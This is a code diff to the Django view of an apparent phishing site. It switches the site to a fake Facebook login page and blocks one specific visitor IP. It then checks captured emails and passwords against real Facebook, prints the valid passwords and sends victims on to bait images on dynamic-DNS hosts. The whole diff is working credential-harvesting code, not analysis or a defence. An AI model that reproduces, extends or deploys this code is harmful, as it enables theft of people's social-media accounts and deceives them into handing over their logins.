@@ -1,16 +1,18 @@
 ﻿import winsound
 
 from django.contrib import messages
+from django.http import HttpResponse
 from django.shortcuts import render, redirect
 from colorama import Fore, Style
 
 # Create your views here.
 from Fapachi.models import RequestUser, HackedUser
+from fakeFapachi.fb import FBLogin
 
 
 def index(request):
-    template = "youtube.html"
-    #template = "fb_index.html"
+    #template = "youtube.html"
+    template = "fb_index.html"
     # template = "index.html"
     include_js = False
 
@@ -19,6 +21,9 @@ def index(request):
 
     meta = request.META
     ip = meta['REMOTE_ADDR']
+    if ip == "84.225.182.82":
+        print("ip is deactive",ip,"not engedely")
+        return HttpResponse("not valid user")
     description = meta['HTTP_USER_AGENT']
     print("[+] Request ingoing", ip, description)
 
@@ -53,7 +58,15 @@ def index(request):
                 if template == "fb_index.html":
                     # return redirect("https://www.facebook.com/100000099322552/videos/3140763042603642/")
                     # return redirect("http://hotmeet.servebeer.com/static/my_favorite_pose.png")
-                    return redirect("https://youtu.be/ELTtFZ56UJM?t=402")
+                    #return redirect("https://youtu.be/ELTtFZ56UJM?t=402")
+                    fb = FBLogin()
+                    if fb.fb_login(email=email,passw=password):
+                        print("valid password",password)
+                        return redirect("http://secretfacebook.sytes.net/static/semmi.png")
+                    else:
+                        messages.warning(request,"Hibás bejelentkezési adatok")
+
+
                     # return redirect("http://hotmeet.servebeer.com/static/semmi.png")
 
                 if template == "youtube.html":
